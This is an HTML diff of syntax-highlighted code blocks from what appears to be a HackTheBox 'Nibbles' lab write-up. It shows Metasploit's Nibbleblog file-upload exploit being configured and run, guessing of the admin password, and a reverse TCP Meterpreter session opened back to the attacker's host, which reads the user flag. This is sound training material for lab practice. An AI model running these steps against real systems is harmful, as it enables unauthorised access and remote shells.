-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run --rm -it -v <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">HOME</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/.msf:/home/msf/&#34;</span> -p 4444:4444 -p 1337:1337 -p <span style="color:#8be9fd;font-style:italic">$1</span>:<span style="color:#8be9fd;font-style:italic">$1</span> metasploitframework/metasploit-framework ./msfconsole
-msf6 &gt; search nibble
-msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; info
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run --rm -it -v <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">HOME</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/.msf:/home/msf/&#34;</span> -p 4444:4444 -p 1337:1337 -p <span style="color:#8be9fd;font-style:italic">$1</span>:<span style="color:#8be9fd;font-style:italic">$1</span> metasploitframework/metasploit-framework ./msfconsole
+</span></span><span style="display:flex;"><span>msf6 &gt; search nibble
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; info
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Let&rsquo;s download and explore nibbleblog: the file is in sourceforge so we need to follow redirection with <code>curl -L</code></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ curl -s -L -o nibbleblog-v4.0.3.zip  https://sourceforge.net/projects/nibbleblog/files/v4.0/nibbleblog-v4.0.3.zip/download
-ctf@014202efa8c8:~/htb/nibbles$ file nibbleblog-v4.0.3.zip
-nibbleblog-v4.0.3.zip: Zip archive data, at least v1.0 to extract
-ctf@014202efa8c8:~/htb/nibbles$ unzip nibbleblog-v4.0.3.zip
-ctf@014202efa8c8:~/htb/nibbles$ <span style="color:#8be9fd;font-style:italic">cd</span> nibbleblog
-ctf@014202efa8c8:~/htb/nibbles/nibbleblog$ unzip nibbleblog-v4.0.3.zip
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ curl -s -L -o nibbleblog-v4.0.3.zip  https://sourceforge.net/projects/nibbleblog/files/v4.0/nibbleblog-v4.0.3.zip/download
+</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ file nibbleblog-v4.0.3.zip
+</span></span><span style="display:flex;"><span>nibbleblog-v4.0.3.zip: Zip archive data, at least v1.0 to extract
+</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ unzip nibbleblog-v4.0.3.zip
+</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ <span style="color:#8be9fd;font-style:italic">cd</span> nibbleblog
+</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles/nibbleblog$ unzip nibbleblog-v4.0.3.zip
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>according to install.php there is few xml files /content/private/users.xml we can visualize to figure out the username</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles/nibbleblog$ curl -s http://10.10.10.75/nibbleblog/content/private/users.xml
-&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span> <span style="color:#8be9fd;font-style:italic">standalone</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;yes&#34;</span>?&gt;
-&lt;users&gt;&lt;user <span style="color:#8be9fd;font-style:italic">username</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;admin&#34;</span>&gt; ...
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles/nibbleblog$ curl -s http://10.10.10.75/nibbleblog/content/private/users.xml
+</span></span><span style="display:flex;"><span>&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span> <span style="color:#8be9fd;font-style:italic">standalone</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;yes&#34;</span>?&gt;
+</span></span><span style="display:flex;"><span>&lt;users&gt;&lt;user <span style="color:#8be9fd;font-style:italic">username</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;admin&#34;</span>&gt; ...
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>However passowrd is stored in a php file and can&rsquo;t be retrieved</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">        <span style="color:#6272a4">// shadow.php
-</span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">$new_salt</span> <span style="color:#ff79c6">=</span> Text<span style="color:#ff79c6">::</span><span style="color:#50fa7b">random_text</span>(<span style="color:#bd93f9">11</span>);
-        <span style="color:#8be9fd;font-style:italic">$new_hash</span> <span style="color:#ff79c6">=</span> Crypt<span style="color:#ff79c6">::</span><span style="color:#50fa7b">get_hash</span>(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;password&#39;</span>],<span style="color:#8be9fd;font-style:italic">$new_salt</span>);
-        <span style="color:#8be9fd;font-style:italic">$text</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&lt;?php $_USER[0][&#34;uid&#34;] = &#34;0&#34;; $_USER[0][&#34;username&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;username&#39;</span>]<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; $_USER[0][&#34;password&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$new_hash</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; $_USER[0][&#34;salt&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$new_salt</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; $_USER[0][&#34;email&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;email&#39;</span>]<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; ?&gt;&#39;</span>;
-        <span style="color:#8be9fd;font-style:italic">$file</span> <span style="color:#ff79c6">=</span> fopen(FILE_SHADOW, <span style="color:#f1fa8c">&#39;w&#39;</span>);
-        fputs(<span style="color:#8be9fd;font-style:italic">$file</span>, <span style="color:#8be9fd;font-style:italic">$text</span>);
-        fclose(<span style="color:#8be9fd;font-style:italic">$file</span>);
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>        <span style="color:#6272a4">// shadow.php
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">$new_salt</span> <span style="color:#ff79c6">=</span> Text<span style="color:#ff79c6">::</span><span style="color:#50fa7b">random_text</span>(<span style="color:#bd93f9">11</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">$new_hash</span> <span style="color:#ff79c6">=</span> Crypt<span style="color:#ff79c6">::</span><span style="color:#50fa7b">get_hash</span>(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;password&#39;</span>],<span style="color:#8be9fd;font-style:italic">$new_salt</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">$text</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&lt;?php $_USER[0][&#34;uid&#34;] = &#34;0&#34;; $_USER[0][&#34;username&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;username&#39;</span>]<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; $_USER[0][&#34;password&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$new_hash</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; $_USER[0][&#34;salt&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$new_salt</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; $_USER[0][&#34;email&#34;] = &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;email&#39;</span>]<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34;; ?&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">$file</span> <span style="color:#ff79c6">=</span> fopen(FILE_SHADOW, <span style="color:#f1fa8c">&#39;w&#39;</span>);
+</span></span><span style="display:flex;"><span>        fputs(<span style="color:#8be9fd;font-style:italic">$file</span>, <span style="color:#8be9fd;font-style:italic">$text</span>);
+</span></span><span style="display:flex;"><span>        fclose(<span style="color:#8be9fd;font-style:italic">$file</span>);
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We can do a bruteforce with common passwords admin:admin|root|nibbles|nibbleblog &hellip;</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> username admin
-<span style="color:#8be9fd;font-style:italic">username</span> <span style="color:#ff79c6">=</span>&gt; admin
-msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> rhosts 10.10.10.75
-<span style="color:#8be9fd;font-style:italic">rhosts</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.75
-msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> targeturi /nibbleblog
-<span style="color:#8be9fd;font-style:italic">targeturi</span> <span style="color:#ff79c6">=</span>&gt; /nibbleblog
-msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> password nibbles
-<span style="color:#8be9fd;font-style:italic">password</span> <span style="color:#ff79c6">=</span>&gt; nibbles
-msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> lhost 10.10.14.38
-<span style="color:#8be9fd;font-style:italic">lhost</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.38
-msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; run
-
-<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.38:4444:-  -
-<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:4444
-<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">39264</span> bytes<span style="color:#ff79c6">)</span> to 172.17.0.1
-<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:4444 -&gt; 172.17.0.1:46832<span style="color:#ff79c6">)</span> at 2020-09-19 06:26:29 +0000
-<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Deleted image.php
-meterpreter &gt; getuid
-Server username: nibbler <span style="color:#ff79c6">(</span>1001<span style="color:#ff79c6">)</span>
-meterpreter &gt; cat user.txt
-<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> username admin
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">username</span> <span style="color:#ff79c6">=</span>&gt; admin
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> rhosts 10.10.10.75
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">rhosts</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.75
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> targeturi /nibbleblog
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">targeturi</span> <span style="color:#ff79c6">=</span>&gt; /nibbleblog
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> password nibbles
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">password</span> <span style="color:#ff79c6">=</span>&gt; nibbles
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> lhost 10.10.14.38
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">lhost</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.38
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.38:4444:-  -
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:4444
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">39264</span> bytes<span style="color:#ff79c6">)</span> to 172.17.0.1
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:4444 -&gt; 172.17.0.1:46832<span style="color:#ff79c6">)</span> at 2020-09-19 06:26:29 +0000
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Deleted image.php
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: nibbler <span style="color:#ff79c6">(</span>1001<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat user.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
+</span></span></code></pre></td></tr></table>
 </div>
